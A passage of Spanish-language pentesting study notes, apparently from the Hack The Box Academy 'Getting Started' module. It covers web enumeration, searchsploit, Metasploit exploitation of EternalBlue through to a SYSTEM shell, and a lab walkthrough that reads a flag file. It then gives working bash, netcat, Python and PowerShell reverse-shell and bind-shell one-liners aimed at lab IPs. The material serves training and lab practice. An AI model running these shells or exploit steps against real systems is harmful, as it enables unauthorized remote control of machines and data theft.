2020/12/17 23:10:34 Finished
===============================================================

~~~

Este escaneo revela varios subdominios interesantes que podríamos examinar más a fondo. El módulo [Atacar aplicaciones web](https://academy.hackthebox.com/module/details/54) con Ffuf brinda más detalles sobre la enumeración web y la fuzzing. 
___
### TIPS DE ENUMERACION WEB

Veamos algunos consejos de enumeración web adicionales que ayudarán a completar las máquinas en HTB y en el mundo real. 
___

### BANNER GRABBING/ENCABEZADOS DE SERVIDORES WEB

En la última sección, discutimos la captura de banners para propósitos generales. Los headers del servidor web brindan una buena imagen de lo que está alojado en un servidor web. Pueden revelar el framework de aplicación específico en uso, las opciones de autenticación y si al servidor le faltan opciones de seguridad esenciales o si se ha configurado incorrectamente. Podemos usar `cURL` para recuperar la información del encabezado del servidor desde la línea de comandos. `cURL` es otra adición esencial a nuestro kit de herramientas de pentest, y se recomienda familiarizarse con sus muchas opciones. 

~~~
$ curl -IL https://www.inlanefreight.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
~~~

Otra herramienta útil es EyeWitness, que se puede usar para tomar screenshots de las aplicaciones web objetivos, tomar huellas digitales e identificar posibles credenciales predeterminadas. 

___

### WHATWEB

Podemos extraer la versión de los servidores web, los frameworks de soporte y las aplicaciones utilizando la herramienta de línea de comandos `whatweb`. Esta información puede ayudarnos a identificar las tecnologías en uso y comenzar a buscar posibles vulnerabilidades. 

~~~
$ whatweb 10.10.10.121

http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
~~~

`Whatweb` es una herramienta útil y contiene muchas funciones para automatizar la enumeración de aplicaciones web en una red. 

~~~
$ whatweb --no-errors 10.10.10.0/24

http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
~~~

___
### CERTIFICADOS

Los certificados SSL/TLS son otra fuente de información potencialmente valiosa si se utiliza HTTPS. Navega en `https://10.10.10.121/` a continuacion revela el detalle de los certificados, incluida la dirección de correo electrónico y el nombre de la empresa. Estos podrían usarse potencialmente para realizar un ataque de phishing si esto está dentro del alcance de una evaluación. 

![Certificado](https://academy.hackthebox.com/storage/modules/77/cert.txt)

___

### ROBOTS.TXT

Es común que los sitios web contengan un archivo `robots.txt`, cuyo propósito es instruir a los rastreadores web de los motores de búsqueda, como Googlebot, a qué recursos se puede o no acceder para la indexación. El archivo `robots.txt` puede proporcionar información valiosa, como la ubicación de archivos privados y páginas de administración. En este caso, vemos que el archivo `robots.txt` contiene dos entradas no permitidas. 

![robot.txt](https://academy.hackthebox.com/storage/modules/77/robots.txt)

Navega en `http://10.10.10.121/private` en un navegador revela una página de inicio de sesión de administrador de HTB. 

![HTB](https://academy.hackthebox.com/storage/modules/77/academy.txt)

___

### CODIGO FUENTE

También vale la pena comprobar el código fuente de cualquier página web con la que nos encontremos. Podemos presionar `[CTRL + U]` para que aparezca la ventana del código fuente en un navegador. Este ejemplo revela un comentario de desarrollador que contiene credenciales para una cuenta de prueba, que podría usarse para iniciar sesión en el sitio web. 

![Codigo-Fuente](https://academy.hackthebox.com/storage/modules/77/source.txt)

___

## EXPLOITS PUBLICOS

Una vez que identificamos los servicios que se ejecutan en los puertos identificados a partir de nuestro escaneo Nmap, el primer paso es buscar si alguna de las aplicaciones/servicios tiene vulnerabilidades públicas. Se pueden encontrar exploits públicos para aplicaciones web y otras aplicaciones que se ejecutan en puertos abiertos, como SSH o ftp. 

___

### ECONTRANDO EXPLOITS PUBLICOS

Muchas herramientas pueden ayudarnos a buscar exploits públicos para las diversas aplicaciones y servicios que podemos encontrar durante la fase de enumeración. Una forma es buscar en Google el nombre de la aplicación con `exploit` para ver si obtenemos algún resultado: 

![Exploits](https://academy.hackthebox.com/storage/modules/77/google_smb.jpg)

Una herramienta muy conocida para este fin es `searchsploit`, que podemos utilizar para buscar vulnerabilidades/exploits públicos para cualquier aplicación. Podemos instalarlo con el siguiente comando:

~~~
$ sudo apt install exploitdb -y
~~~

Luego, podemos usar `searchsploit` para buscar una aplicación específica por su nombre, de la siguiente manera: 

~~~
$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------

~~~

También podemos utilizar bases de datos de exploits en línea para buscar vulnerabilidades, como [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/) o [Vulnerability Lab](https://www.vulnerability-lab.com/). El módulo [Introducción a las aplicaciones web](https://academy.hackthebox.com/module/details/75) discute las vulnerabilidades públicas de las aplicaciones web. 
___

### METASPLOIT PRIMER

Metasploit Framework (MSF) es una excelente herramienta para pentesters. Contiene muchos exploits incorporados para muchas vulnerabilidades públicas y proporciona una manera fácil de usar estos exploits contra objetivos vulnerables. MSF tiene muchas otras características, como: 
+ Ejecución de scripts de reconocimiento para enumerar hosts remotos y objetivos comprometidos

+ Scripts de verificación para probar la existencia de una vulnerabilidad sin comprometer realmente el objetivo

+ Meterpreter, que es una gran herramienta para conectarse a shells y ejecutar comandos en los objetivos comprometidos

+ Muchas herramientas de post-explotación y pivote 

Tomemos un ejemplo básico de búsqueda de un exploit para una aplicación que estamos atacando y cómo explotarlo. Para ejecutar Metasploit, podemos usar el comando `msfconsole`: 

~~~
 msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
~~~

Una vez que tengamos Metasploit ejecutándose, podemos buscar nuestra aplicación de destino con el comando `search exploit`. Por ejemplo, podemos buscar la vulnerabilidad SMB que identificamos anteriormente: 

~~~
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
   
~~~
Tip: La búsqueda puede aplicar filtros complejos como search cve:2009 type:exploit. Ver todos los filtros con búsqueda de ayuda 

Encontramos un exploit para este servicio. Podemos usarlo copiando el nombre completo del mismo y usando `USE` para usarlo: 

~~~
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
~~~

Antes de que podamos ejecutar el exploit, debemos configurar sus opciones. Para ver las opciones disponibles para configurar, podemos usar el comando `show options`: 

~~~
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...

~~~

Cualquier opción con el conjunto `Required` en sí debe establecerse para que funcione el exploit. En este caso, solo tenemos dos opciones para configurar: RHOSTS, que significa la IP de nuestro objetivo (esta puede ser una IP, varias IP o un archivo que contiene una lista de IP). Podemos configurarlos con el comando set: 

~~~
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
~~~

Una vez que tengamos configuradas ambas opciones, podemos comenzar la explotación. Sin embargo, antes de ejecutar el script, podemos ejecutar una verificación para asegurarnos de que el servidor sea vulnerable: 

~~~

msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.

~~~

Como podemos ver, el servidor es realmente vulnerable. Tenga en cuenta que no todos los exploits en `Metasploit Framework` admiten la función de verificación. Finalmente, podemos usar el comando `run` o `exploit` para ejecutar el exploit: 

~~~
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
~~~

Como podemos ver, pudimos obtener acceso de administrador al Box y usamos el comando de `shell` para colocarnos en un shell interactivo. Estos son ejemplos básicos del uso de Metasploit para explotar una vulnerabilidad en un servidor remoto. Hay muchas Box retiradas en la plataforma Hack The Box que son excelentes para practicar Metasploit. Algunos de estos incluyen, pero no se limitan a: 

+ Granny/Grandpa
+ Jerry
+ Blue
+ Lame
+ Optimum
+ Legacy
+ Devel

Más adelante, en este módulo, recorreremos paso a paso el Box `Nibbles`y luego mostraremos la explotación usando Metasploit. Metasploit es otra herramienta esencial para agregar a nuestro conjunto de herramientas, pero es crucial no solo confiar en ella. Para ser evaluadores completos, debemos saber cómo aprovechar mejor todas las herramientas disponibles, comprender por qué a veces fallan y saber cuándo cambiar a técnicas manuales u otras herramientas. 
___
~~~
Intente identificar los servicios que se ejecutan en el servidor anterior y luego intente buscar para encontrar exploits públicos para explotarlos. Una vez que lo haga, intente obtener el contenido del archivo '/flag.txt'. (nota: el servidor web puede tardar unos segundos en iniciarse) 
~~~
Primero vamos a escanear puertos, no es posble hacer pin a un puerto, usamos `-Pn`para forzar el escaneo de puertos 
~~~
 nmap -sV -sC -Pn -p30960  46.101.61.42 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 13:57 UTC
Nmap scan report for 46.101.61.42
Host is up (0.45s latency).

PORT      STATE SERVICE VERSION
30960/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Getting Started &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.6.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds
~~~
Vemos que esta corriendo wordpress, podemos ver las vulnerabilidades que hay con estas versiones tanto de apache como de wordpress

~~~
$ searchsploit WordPress 5.6.1    

-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities       | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                 | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection               | php/webapps/48918.sh
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

~~~
$searchsploit Apache 2.4.41  

-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner         | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                       | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1 | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2 | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Ex | linux/remote/34.pl
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

vemos todas las vulnerabilidades pero una de las practicas o detalles basicos son revisar en el navegador la ip para comprobar que es lo que nos muestra, en este caso nos muestra 

Simple Backup Plugin 2.7.10 for WordPress

Que quiere decir que esto es lo que podriamos usar para conseguir la flag, entonces buscaremos este exploit

~~~
msf6 > search exploit Simple Backup Plugin 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read                   normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
~~~

usamos ese exploit y revisamos las opciones

~~~
msf6 > use 0
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

~~~

Como ya hemos visto tenemos que configurar `RHOST`y por supuesto el `RPORT`, pero un detalle en esta configuracion es FILEPATH, en esta opcion es que tenemos que colocar la ruta de lo que querramos obtener, en este caso lo tenemos que cambiar por `/flag.txt

~~~
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 188.166.148.4
RHOSTS => 188.166.148.4

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set rport 32497
rport => 32497

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
~~~

y vemos entonces que la configuracion queda asi

~~~
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /flag.txt        yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     188.166.148.4    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      32497            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host
~~~

Ejecutamos el exploit:

~~~
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit

[+] File saved in: /root/.msf4/loot/20220321154255_default_188.166.148.4_simplebackup.tra_126641.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~

Ahora solo tendriamos que ubicar la ruta `/root/.msf4/loot/` y abrir el archivo `20220321154255_default_188.166.148.4_simplebackup.tra_126641.txt`

~~~
cat /root/.msf4/loot/20220321154255_default_188.166.148.4_simplebackup.tra_126641.txt

HTB{my_f1r57_h4ck}
~~~
___

## **TIPOS DE SHELLS**

Una vez que comprometemos un sistema y explotamos una vulnerabilidad para ejecutar comandos en los hosts comprometidos de forma remota, generalmente necesitamos un método de comunicación con el sistema para no tener que seguir explotando la misma vulnerabilidad para ejecutar cada comando. Para enumerar el sistema o tomar más control sobre él o dentro de su red, necesitamos una conexión confiable que nos brinde acceso directo al shell del sistema, es decir, Bash o PowerShell, para que podamos investigar a fondo el sistema remoto para nuestro próximo movimiento. 

Una forma de conectarse a un sistema comprometido es a través de protocolos de red, como `SSH` para Linux o `WinRM` para Windows, lo que nos permitiría iniciar sesión de forma remota en el sistema comprometido. Sin embargo, a menos que obtengamos un conjunto funcional de credenciales de inicio de sesión, no podremos utilizar estos métodos sin ejecutar primero los comandos en el sistema remoto, para obtener acceso a estos servicios en primer lugar. 

El otro método para acceder a un host comprometido para el control y la ejecución remota de código es a través de shells.
Como se discutió anteriormente, hay tres tipos principales de shells: Reverse Shell, Bind Shell y Web Shell. Cada uno de estos proyectiles tiene un método diferente de comunicación con nosotros para aceptar y ejecutar nuestros comandos. 

| Tipo de Shell | Metodo de comunicacion |
| -- | -- |
| Reverse Shell |Se conecta de nuevo a nuestro sistema y nos da el control a través de una conexión inversa. |
| Bind Shell | Espera a que nos conectemos a ella y nos da control una vez que lo hacemos |
| Web Shell | Se comunica a través de un servidor web, acepta nuestros comandos a través de parámetros HTTP, los ejecuta e imprime la salida. | 

Profundicemos más en cada uno de las shells anteriores y analicemos ejemplos de cada uno. 
___

### REVERSE SHELL

Es el tipo de shell más común, ya que es el método más rápido y sencillo para obtener control sobre un host comprometido. Una vez que identificamos una vulnerabilidad en el host remoto que permite la ejecución remota de código, podemos iniciar un listener de `netcat` en nuestra máquina que escucha en un puerto específico, digamos el puerto `1234`. Con este listener en su lugar, podemos ejecutar un comando reverse shell que conecta el shell del sistema remoto, es decir, Bash o PowerShell a nuestro listener netcat, lo que nos proporciona una conexión inversa sobre el sistema remoto. 

#### NETCAT LISTENER

El primer paso es iniciar un netcat listener en un puerto de nuestra elección: 

~~~
$ nc -lvnp 1234

listening on [any] 1234 ...
~~~

Las flags que estamos usando son las siguientes: 

| Flag | Descripcion
| -- | -- |
| -l | Modo escucha, para esperar una conexión para conectarnos. |
| -v | Modo verbose, para que sepamos cuando recibimos una conexión. | 
| -n | Deshabilita la resolución de DNS y solo conécta desde/hacia IP para acelerar la conexión. |
| -p 1234 | El número de puerto netcat está escuchando y se debe enviar la conexión inversa. |

Ahora que tenemos un listener de netcat esperando una conexión, podemos ejecutar el comando de shell inverso que se conecta a nosotros. 

#### *CONECTAR IP POSTERIOR*

Sin embargo, primero, necesitamos encontrar la IP de nuestro sistema para enviarnos una conexión inversa. Podemos encontrar nuestra IP con el siguiente comando: 

~~~

$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...

~~~

En nuestro ejemplo, la IP que nos interesa está bajo tun0, que es la misma red HTB a la que nos conectamos a través de nuestra VPN. 

>Nota: Nos estamos conectando a la IP en 'tun0' porque solo podemos conectarnos a las box HackTheBox a través de la conexión VPN, ya que no tienen conexión a Internet y, por lo tanto, no pueden conectarse a nosotros a través de Internet usando 'eth0'. En un pentest real, puede estar conectado directamente a la misma red, o realizando una prueba de penetración externa, por lo que puede conectarse a través del adaptador `eth0` o similar.

#### *COMANDO REVERSE SHELL*

El comando que ejecutamos depende del sistema operativo en el que se ejecuta el host comprometido, es decir, Linux o Windows, y a qué aplicaciones y comandos podemos acceder. La página [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) tiene una lista completa de comandos de shell inverso que podemos usar que cubren una amplia gama de opciones dependiendo de nuestro host comprometido. 

Ciertos comandos de shell inverso son más confiables que otros y, por lo general, se pueden intentar para obtener una conexión inversa. Los siguientes comandos son comandos confiables que podemos usar para obtener una conexión inversa, para bash en hosts comprometidos de Linux y Powershell en hosts comprometidos de Windows: 
Code: `bash`
~~~
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
~~~

Code: `bash`
~~~
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
~~~

Code: `powershell`
~~~
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

Podemos utilizar el exploit que tenemos sobre el host remoto para ejecutar uno de los comandos anteriores, es decir, a través de un exploit de Python o un módulo de Metasploit, para obtener una conexión inversa. Una vez que lo hagamos, deberíamos recibir una conexión en nuestro listener netcat: 

comando reverse shell
~~~
$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Como podemos ver, después de recibir una conexión en nuestro listener de netcat, pudimos escribir nuestro comando y recuperar directamente su output, directamente en nuestra máquina. 

Un Reverse Shell es útil cuando queremos obtener una conexión rápida y confiable a nuestro host comprometido. Sin embargo, un Reverse Shell puede ser muy frágil. Una vez que se detiene el comando de reverse shell, o si perdemos nuestra conexión por cualquier motivo, tendríamos que usar el exploit inicial para ejecutar el comando de reverse shell nuevamente para recuperar nuestro acceso. 

___

### BIND SHELL

Otro tipo de shell es un Bind Shell. A diferencia de un Reverse Shell que se conecta a nosotros, tendremos que conectarnos a él en el puerto de escucha de los objetivos. 

Una vez que ejecutamos un comando Bind Shell, comenzará a escuchar en un puerto en el host remoto y vinculará el shell de ese host, es decir, Bash o PowerShell, a ese puerto. Tenemos que conectarnos a ese puerto con netcat, y obtendremos el control a través de un shell en ese sistema. 
___

### COMANDO BIND SHELL

Una vez más, podemos utilizar [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) para encontrar un comando adecuado para iniciar nuestro bind shell

>Nota: iniciaremos una conexión de escucha en el puerto '1234' en el host remoto, con IP '0.0.0.0' para que podamos conectarnos desde cualquier lugar. 

Los siguientes son comandos confiables que podemos usar para iniciar una bind shell:

Code: `bash`
~~~
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
~~~

Code: `python`
~~~
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
~~~

Code: `powershell`
~~~
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
~~~
___

### CONEXION NETCAT

Una vez que ejecutamos el comando bind shell, deberíamos tener un shell esperándonos en el puerto especificado. Ahora podemos conectarnos a él.

Podemos usar netcat para conectarnos a ese puerto y obtener una conexión con el shell: 

Conexion netcat
~~~
 nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Como podemos ver, se nos coloca directamente en una sesión de bash y podemos interactuar directamente con el sistema de destino. A diferencia de Reverse Shell, si interrumpimos nuestra conexión a un bind shell por cualquier motivo, podemos volver a conectarnos y obtener otra conexión de inmediato. Sin embargo, si el comando bind shell se detiene por algún motivo, o si se reinicia el host remoto, perderíamos nuestro acceso al host remoto y tendremos que explotarlo nuevamente para obtener acceso. 
___

### UPGRADING TTY

Una vez que nos conectemos a un shell a través de Netcat, notaremos que solo podemos escribir comandos o retroceder, pero no podemos mover el cursor de texto hacia la izquierda o hacia la derecha para editar nuestros comandos, ni podemos subir y bajar para acceder al historial de comandos. Para poder hacer eso, necesitaremos actualizar nuestro TTY. Esto se puede lograr mapeando nuestro TTY terminal con el TTY remoto. 

Hay múltiples métodos para hacer esto. Para nuestros propósitos, usaremos el método `python/stty`. En nuestro shell netcat, usaremos el siguiente comando para usar python para actualizar el tipo de nuestro shell a un TTY completo: 

~~~
$ python -c 'import pty; pty.spawn("/bin/bash")'
~~~

